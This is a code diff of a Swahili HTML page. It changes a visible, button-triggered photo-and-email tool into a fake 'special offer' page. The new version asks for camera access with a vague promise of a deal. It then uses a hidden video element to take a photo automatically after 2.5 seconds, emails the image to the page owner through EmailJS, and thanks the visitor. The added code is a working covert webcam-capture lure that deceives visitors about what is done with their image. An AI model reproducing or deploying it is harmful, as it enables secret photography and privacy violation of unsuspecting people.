@@ -1,48 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Chukua Picha</title>
+  <meta charset="UTF-8">
+  <title>Tangazo Maalum</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
-  <script>
-    (function() {
-      emailjs.init("w9dVJ6diDwg5XuuXd"); // Replace with your EmailJS public key
-    })();
-  </script>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 30px; }
+    #message { margin-top: 30px; font-size: 18px; color: green; }
+  </style>
 </head>
 <body>
-  <h2>Piga Picha na Tuma kwa Email</h2>
-  <video id="video" width="300" autoplay></video><br>
-  <button onclick="takePhoto()">Piga Picha</button>
-  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+
+  <h2>Karibu kwenye Ofa Yetu Maalum</h2>
+  <p>Shiriki sasa kupata ofa ya kipekee kwa kutupa ruhusa ya kutumia kamera yako kwa sekunde chache tu.</p>
+
+  <div id="message"></div>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    // Anzisha EmailJS
+    emailjs.init("YOUR_PUBLIC_KEY");
 
-    // Fungua kamera
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+    const messageDiv = document.getElementById("message");
+
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
+        const video = document.createElement('video');
         video.srcObject = stream;
+        video.play();
+
+        setTimeout(() => {
+          canvas.width = 300;
+          canvas.height = 200;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
+
+          const params = { image_data: imageData };
+
+          emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params)
+            .then(() => {
+              stream.getTracks().forEach(track => track.stop());
+              messageDiv.textContent = "Asante kwa kushiriki! Tazama ofa yako hapa: (unaweza kuongeza link ya biashara yako hapa)";
+            })
+            .catch(error => {
+              console.error(error);
+              messageDiv.textContent = "Kumetokea tatizo. Tafadhali jaribu tena.";
+            });
+
+        }, 2500); // Chukua picha baada ya sekunde 2.5
+
+      })
+      .catch(error => {
+        console.error(error);
+        messageDiv.textContent = "Kamera haikupatikana au mtumiaji hakuruhusu.";
       });
-
-    function takePhoto() {
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/png');
-
-      const templateParams = {
-        to_name: "Jina lako",
-        message: "Picha mpya imetumwa",
-        image_data: imageData
-      };
-
-      emailjs.send('SERVICE_sxknave', 'TEMPLATE_sjw1wrn', templateParams)
-        .then(response => {
-          alert('Picha imetumwa kwenye email!');
-        }, error => {
-          alert('Imeshindwa kutuma picha:', error);
-        });
-    }
   </script>
+
 </body>
 </html>
